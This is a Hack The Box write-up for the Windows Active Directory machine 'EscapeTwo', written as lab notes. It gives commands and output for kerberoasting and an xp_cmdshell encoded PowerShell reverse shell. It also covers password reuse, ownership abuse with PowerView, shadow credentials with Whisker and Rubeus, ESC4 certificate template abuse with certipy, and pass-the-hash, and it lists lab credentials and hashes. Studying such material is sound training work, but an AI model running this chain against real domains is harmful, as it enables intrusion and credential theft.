---
{"dg-publish":true,"permalink":"/personal-site/completed-writeups/htb/escape-two/","tags":["#windows","ActiveDirectory","NXC","bloodhound","passwordReuse","xp_cmdshell","publicShares","shadowCredentials","ESC4"],"dg-note-properties":{"Difficulty":"easy","tags":["#windows","ActiveDirectory","NXC","bloodhound","passwordReuse","xp_cmdshell","publicShares","shadowCredentials","ESC4"]}}
---


# 10.10.11.51
---
# Enumeration &  Recon

## ports
```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-11 20:07:38Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
50001/tcp open  msrpc         Microsoft Windows RPC

```


## Users
```bash
❯ nxc smb 10.10.11.51 -u rose -p 'KxEPkKe6R8su' --users 
----------------------------------------------------
Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
----------------------------------------------------
Administrator
Guest
krbtgt
michael
ryan
oscar
sql_svc
rose
ca_svc

```
## creds
`rose:KxEPkKe6R8su` 
`oscar:86LxLBMgEWaKUnBG`
`sa:MSSQLP@ssw0rd!`
`ryan:WqSZAF6CysDQbGb3`

## kerberoastable users:

- prebuilt cypher query for all kerberoastable users
![Pasted image 20250111225855.png](/img/user/img/Pasted%20image%2020250111225855.png)

- `nxc --kerberoast` will give us the `krb5tgs` hashes that we can crack for them
```bash
❯ nxc ldap 10.10.11.51 -u rose -p 'KxEPkKe6R8su' --dns-server 10.10.11.51 --kerberoast ./kerberoastable.txt
------------------------------------------------------
ca_svc
sql_svc

```

> [!info]
> reminder `hashcat -m 13100` for krb5tgs
- none of the usual passwd lists worked, so prob a rabbit hole

# Exploitation i.e getting a foothold
- enumerate shares, in Accounting Department there is an .xlsx spreadsheet that's kinda garbled but you can get unames and passwds from it. one of those is sql_svc or 'sa'.
- use nxc xp_cmdshell execution to trigger and catch a revshell:
```bash
❯ nxc mssql 10.10.11.51 -u sa -p 'MSSQLP@ssw0rd!' --local-auth -x 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALg
<continued b64 payload>'

```


```bash
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4451
Ncat: Listening on 0.0.0.0:4451
Ncat: Connection from 10.10.11.51.
Ncat: Connection from 10.10.11.51:49580.
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeCreateGlobalPrivilege       Create global objects          Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
PS C:\Windows\system32> 

```

## DB stuff
```bash
❯ mssqlclient.py sa:MSSQLP@ssw0rd!@sequel.htb
```
- just default mssql dbs

enumerating the root dir, there's a folder SQL2019 that has a `sql-Configuration.INI` with the `sql_svc` password in it

running another ldap or smb auth with nxc for ryan shows password reuse from sql_svc.
```bash
❯ nxc ldap sequel.htb -u ryan -p passwords.txt
---------------------------------------------------
SMB         10.129.19.27    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
LDAP        10.129.19.27    389    DC01             [-] sequel.htb\ryan:0fwz7Q4mSpurIt99 
LDAP        10.129.19.27    389    DC01             [-] sequel.htb\ryan:86LxLBMgEWaKUnBG 
LDAP        10.129.19.27    389    DC01             [-] sequel.htb\ryan:Md9Wlq1E5bZnVDVo 
LDAP        10.129.19.27    389    DC01             [-] sequel.htb\ryan:MSSQLP@ssw0rd! 
LDAP        10.129.19.27    389    DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 

```


checking bloodhound we see that ryan is in the remote management group, which can also be confirmed with nxc.

![Pasted image 20250111225601.png](/img/user/img/Pasted%20image%2020250111225601.png)

```bash
❯ nxc winrm sequel.htb -u ryan -p passwords.txt
---------------------------------------------------
WINRM       10.129.19.27    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
WINRM       10.129.19.27    5985   DC01             [-] sequel.htb\ryan:0fwz7Q4mSpurIt99
WINRM       10.129.19.27    5985   DC01             [-] sequel.htb\ryan:86LxLBMgEWaKUnBG
WINRM       10.129.19.27    5985   DC01             [-] sequel.htb\ryan:Md9Wlq1E5bZnVDVo
WINRM       10.129.19.27    5985   DC01             [-] sequel.htb\ryan:MSSQLP@ssw0rd!
WINRM       10.129.19.27    5985   DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 (brumb0wn3d!)

```
# Post Exploitation i.e. privsec

- we now have a shell as `ryan`
	- `user.txt` is in his desktop
```bash
❯ evil-winrm -i sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3'
---------------------------------------------------
*Evil-WinRM* PS C:\Users\ryan\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```
nothing useful here

ryan has WriteOwner perms on the `ca_svc` account:
![Pasted image 20250112182444.png](/img/user/img/Pasted%20image%2020250112182444.png)
We'll need PowerView, Whisker, and Rubeus for this, so make sure to upload them all through evil-winrm.

1. `import-module ./PowerView.ps1`
3. `set-domainobjectowner -Identity ca_svc -OwnerIdentity ryan`
4. `add-domainobjectacl -TargetIdentity ca_svc -PrincipalIdentity ryan -Rights All`
5. `get-objectacl -resolveguids | ? {$_.securityidentifier -eq "S-1-5-21-548670397-972687484-3496335370-1114"}` double check ownership/rights worked
6. `Whisker.exe add /target:ca_svc`
	1. take the output of that for rubeus and run it
7. `Rubeus.exe asktgt /user:ca_svc /certificate:MIIJwAIBAzCCCX<rest of cert> /password:"rNRdZhVCH6ot7uwd" /domain:sequel.htb /dc:DC01.sequel.htb /getcredentials /show`
8. now we have shadow credentials for `ca_svc`:
```
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=ca_svc
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\ca_svc'
[*] Using domain controller: ::1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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

  ServiceName              :  krbtgt/sequel.htb
  ServiceRealm             :  SEQUEL.HTB
  UserName                 :  ca_svc (NT_PRINCIPAL)
  UserRealm                :  SEQUEL.HTB
  StartTime                :  1/13/2025 2:01:48 PM
  EndTime                  :  1/14/2025 12:01:48 AM
  RenewTill                :  1/20/2025 2:01:48 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  63TSwX4BaWwD7CgNqtZHuA==
  ASREP (key)              :  5CDE52DC870BE7E23BD5023B93564DE5

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 3B181B914E7A9D5508EA1E20BC2B7FCE

```

we can use this ntlm hash to look for templates remotely as ca_svc using certipy:
```bash
❯ certipy find -u ca_svc@sequel.htb -hashes '3B181B914E7A9D5508EA1E20BC2B7FCE' -dc-ip sequel.htb -vulnerable -stdout -ns 10.129.2.112
-----------------------------------------------------
Certificate Templates
  0
    Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireCommonName
                                          SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Enterprise Admins
        Full Control Principals         : SEQUEL.HTB\Cert Publishers
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Property Principals       : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions

```
- make sure to provide the ns

this indicates ESC4 and a search finds us:
https://www.thehacker.recipes/ad/movement/adcs/access-controls#certificate-templates-esc4

then we can modify the template:
```bash
❯ certipy template -u ca_svc@sequel.htb -hashes '3B181B914E7A9D5508EA1E20BC2B7FCE' -dc-ip sequel.htb -ns 10.129.2.112 -template DunderMifflinAuthentication -save-old
-----------------------------------------------------
[*] Saved old configuration for 'DunderMifflinAuthentication' to 'DunderMifflinAuthentication.json'
[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Successfully updated 'DunderMifflinAuthentication'

```
For whatever reason you need to do this a couple of times before it takes effect, else you get an error requesting the cert afterwards, and only get the key. you can see the output difference with `-debug`

request the admin cert:
```bash
❯ certipy req -u ca_svc -hashes '3B181B914E7A9D5508EA1E20BC2B7FCE' -dc-ip 10.129.2.112 -ns 10.129.2.112 -dns 10.129.2.112 -target sequel.htb -ca 'SEQUEL-DC01-CA' -template DunderMifflinAuthentication -upn 'administrator@sequel.htb'
```

this will give you the `administrator.pfx`,
which you can auth with to get a hash:
```bash
❯ certipy auth -pfx administrator_10.pfx
---------------------------------------------------
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```

then you can get a winrm shell as admin by passing the hash (reminder it's the second half of the hash we got):
```bash
❯ evil-winrm -i sequel.htb -u administrator -H '7a8d4e04986afa8ed4060f75e5a0b3ff'

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
sequel\administrator
```

root flag is in desktop